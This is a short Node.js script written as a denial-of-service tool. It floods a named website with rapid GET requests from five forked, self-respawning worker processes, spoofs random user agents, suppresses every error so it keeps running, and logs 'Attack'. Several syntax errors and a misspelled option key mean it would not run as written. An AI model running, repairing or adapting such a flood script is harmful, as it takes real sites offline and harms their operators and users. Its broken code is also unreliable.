const cluster = require('cluster')
const axios = require('axios')
const fakeUa = require('fake-useragent')

function processmain(){
    function main(){
    var pop={
        url:'https://cungcang.xyz/',
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'user-agent':fakeUa()
            
        }
    }
    axios(pop,function()={
        console.log('Attack EES')
    })
    
    }
    
    function run(){
        setInterval(()=>{
            main()
        })
    }
    function thread(){
        if (cluster.isMaster){
            for (let i=0;i<5;i++){
                cluster.fork()
            }
            cluster.on('exit',function{
                cluster.fork()
            })
        }
        else{
            run()
        }
    }
    thread()
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
processmain()